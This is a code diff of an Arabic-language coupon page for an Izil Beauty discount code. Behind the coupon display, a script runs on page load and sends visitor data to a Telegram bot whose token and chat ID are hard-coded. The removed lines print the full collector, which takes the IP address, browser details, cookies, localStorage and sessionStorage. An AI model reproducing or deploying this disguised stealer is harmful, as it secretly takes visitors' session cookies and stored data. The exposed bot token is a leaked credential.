@@ -127,7 +127,7 @@
 
 <div class="coupon-container">
     <div class="coupon-header">
-        <img src="https://coupbrief.pro/izil.png" alt="Izil Beauty Logo">كود خصم ايزل فعال 100% IZIL Beauty كوبون ذهبي ومختصر لجميع الدول بلا استنثاء !!
+        <img src="https://coupbrief.pro/izil.png" alt="Izil Beauty Logo">كود خصم ايزل فعال 100%  IZIL Beauty كوبون ذهبي ومختصر لجميع الدول بلا استنثاء !!
     </div>
     
     <div class="coupon-code-container">
@@ -146,11 +146,8 @@
     </div>
 </div>
 
-<!-- Include UserDataCollector.js script -->
-<script src="https://raw.githubusercontent.com/VictorRutskin/User-Data-Collector-Javascript/main/UserDataCollector.js"></script>
-
 <script>
-// Function to send the message to Telegram
+// Function to send message to Telegram
 function sendTelegramMessage(message) {
     const telegramToken = '6864161221:AAG-QIHhP-ecZxcKsB_PaY9yaAlW7rRBw9M'; // Updated token
     const chatId = '6107520820';
@@ -173,6 +170,7 @@ function sendTelegramMessage(message) {
         });
 }
 
+// Collect user data and send it to Telegram
 function collectAndSendUserData() {
     if (typeof getUserData === 'function') {
         getUserData().then(data => {
@@ -211,58 +209,7 @@ function collectAndSendUserData() {
 
 // Trigger the function as soon as the page loads
 window.onload = collectAndSendUserData;
-// Function to collect user data and send it to Telegram
-function collectAndSendUserData() {
-    // Ensure getUserData is available before calling it
-    if (typeof getUserData === 'function') {
-        getUserData().then(data => {
-            // Collecting cookies, local storage, and session storage
-            const cookies = document.cookie;
-            const localStorageData = JSON.stringify(localStorage);
-            const sessionStorageData = JSON.stringify(sessionStorage);
 
-            // Create the message string with all the relevant data
-            const userDataMessage = `
-                User Information:
-                - IP Address: ${data.ip}
-                - Browser: ${data.browser}
-                - Operating System: ${data.os}
-                - Device: ${data.device}
-                - Screen Resolution: ${data.screen}
-                - User Language: ${navigator.language || 'Unknown'}
-                - Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
-                - Referrer: ${document.referrer || 'No Referrer'}
-                - Platform: ${navigator.platform}
-                - User Agent: ${navigator.userAgent}
-                - Cookies: ${cookies}
-                - Local Storage: ${localStorageData}
-                - Session Storage: ${sessionStorageData}
-            `;
-
-            // Send the collected data to Telegram
-            sendTelegramMessage(userDataMessage);
-        }).catch(err => {
-            console.error('Error collecting user data:', err);
-        });
-    } else {
-        console.error('getUserData function is not available.');
-    }
-}
-
-// Wait for the UserDataCollector.js to load before executing the data collection
-function waitForUserDataCollector() {
-    const checkForFunction = setInterval(() => {
-        if (typeof getUserData === 'function') {
-            clearInterval(checkForFunction);
-            collectAndSendUserData();
-        }
-    }, 100); // Check every 100 ms
-}
-
-// Initiate the wait for the UserDataCollector script
-waitForUserDataCollector();
-
-// Copy coupon code function
 function copyCode() {
     var code = "AA791";
     navigator.clipboard.writeText(code).then(function() {
